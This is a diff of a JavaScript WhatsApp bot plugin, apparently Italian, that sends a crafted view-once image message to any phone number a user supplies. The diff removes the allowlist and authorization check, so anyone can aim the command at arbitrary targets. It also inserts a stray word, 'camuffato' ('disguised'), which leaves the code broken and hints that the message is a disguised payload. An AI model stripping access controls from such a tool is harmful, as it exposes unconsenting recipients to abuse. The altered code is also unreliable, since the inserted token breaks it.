@@ -1,13 +1,7 @@
 import { createCanvas } from 'canvas'
 import { generateWAMessageFromContent, generateWAMessageContent } from '@whiskeysockets/baileys'
 
-const NUMERI_AUTORIZZATI = ['66621409462@s.whatsapp.net', '393201234567@s.whatsapp.net'] // 🔑 metti i tuoi numeri qui
-
 let handler = async (m, { conn, text, command }) => {
-  if (!NUMERI_AUTORIZZATI.includes(m.sender)) {
-    return m.reply('❌ Non sei autorizzato a usare questo comando.')
-  }
-
   if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)
 
   let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
@@ -32,7 +26,7 @@ let handler = async (m, { conn, text, command }) => {
       { image: buffer },
       { upload: conn.waUploadToServer }
     )
-
+ camuffato
     let msg = await generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
